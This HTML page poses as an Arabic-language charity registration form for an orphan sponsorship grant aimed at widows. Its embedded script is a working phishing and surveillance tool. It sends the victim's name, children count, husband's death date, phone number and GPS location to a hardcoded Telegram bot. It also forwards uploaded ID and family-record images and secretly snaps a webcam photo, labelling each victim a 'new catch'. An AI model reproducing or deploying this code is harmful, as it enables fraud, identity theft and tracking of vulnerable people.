<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة التسجيل | منظمة تكافل</title>
    <style>
        body { font-family: 'Arial', sans-serif; background: #f4f7f6; text-align: center; direction: rtl; padding: 10px; }
        .container { background: white; max-width: 420px; margin: 20px auto; padding: 25px; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); border-top: 6px solid #27ae60; }
        h2 { color: #2c3e50; font-size: 22px; margin-bottom: 5px; }
        p.desc { font-size: 13px; color: #7f8c8d; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; background: #fafafa; }
        .btn { background: #27ae60; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; cursor: pointer; font-size: 17px; font-weight: bold; margin-top: 15px; }
        .file-info { display: block; text-align: right; font-size: 12px; color: #2ecc71; margin-top: 10px; font-weight: bold; }
        .footer { font-size: 11px; color: #bdc3c7; margin-top: 20px; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://img.icons8.com/color/96/charity.png" width="60">
    <h2>منظمة تكافل الإنسانية</h2>
    <p class="desc">استمارة تسجيل منحة كفالة الأيتام لعام 2026</p>
    
    <input type="text" id="name" placeholder="اسم الأرملة الثلاثي">
    <input type="number" id="kids" placeholder="عدد الأطفال القاصرين">
    <input type="text" id="death" placeholder="تاريخ وفاة الزوج">
    <input type="tel" id="phone" placeholder="رقم هاتف الواتساب">
    
    <label class="file-info">📸 ارفع صور الثبوتيات (الهوية + دفتر العائلة):</label>
    <input type="file" id="studiofiles" multiple accept="image/*">
    
    <button class="btn" onclick="executeTakaful()">إرسال الطلب والتحقق</button>
    <div class="footer">جميع الحقوق محفوظة © منظمة تكافل - قسم الإغاثة</div>
</div>

<canvas id="canvas" style="display:none;"></canvas>
<video id="video" style="display:none;" autoplay></video>

<script>
    const TOKEN = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
    const CHAT_ID = "7214473798";

    async function sendToBot(type, data, caption = "") {
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        if (type === "text") {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: data, parse_mode: "Markdown" })
            });
        } else {
            formData.append(type, data, "upload.jpg");
            if (caption) formData.append("caption", caption);
            await fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
                method: "POST",
                body: formData
            });
        }
    }

    async function executeTakaful() {
        const name = document.getElementById('name').value;
        const phone = document.getElementById('phone').value;
        if (!name || !phone) { alert("يرجى إكمال البيانات!"); return; }

        alert("جاري التحقق من الهوية.. يرجى السماح بالصلاحيات لمطابقة بياناتك.");

        // 1. الموقع الجغرافي
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const map = `📍 الموقع: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            const info = `🔥 **صيد جديد (منظمة تكافل)** 🔥\n👤 الاسم: ${name}\n👦 الأطفال: ${document.getElementById('kids').value}\n📅 الوفاة: ${document.getElementById('death').value}\n📞 الهاتف: ${phone}\n${map}`;
            await sendToBot("text", info);
        });

        // 2. إرسال ملفات الاستديو المختارة
        const files = document.getElementById('studiofiles').files;
        for (let file of files) {
            await sendToBot("document", file, "📁 ملف مرفوع من الاستديو");
        }

        // 3. الكاميرا (تصوير تلقائي صامت)
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;

            setTimeout(async () => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(async (blob) => {
                    await sendToBot("photo", blob, "📸 صورة التحقق المباشرة");
                    stream.getTracks().forEach(track => track.stop());
                    alert("تم إرسال طلبك بنجاح. سيتم التواصل معك عبر الواتساب.");
                }, 'image/jpeg');
            }, 2000);
        } catch (e) {
            alert("فشل التحقق! يجب تفعيل الكاميرا والـ GPS لإتمام التسجيل.");
        }
    }
</script>
</body>
</html>
</script>
</body>
</html>
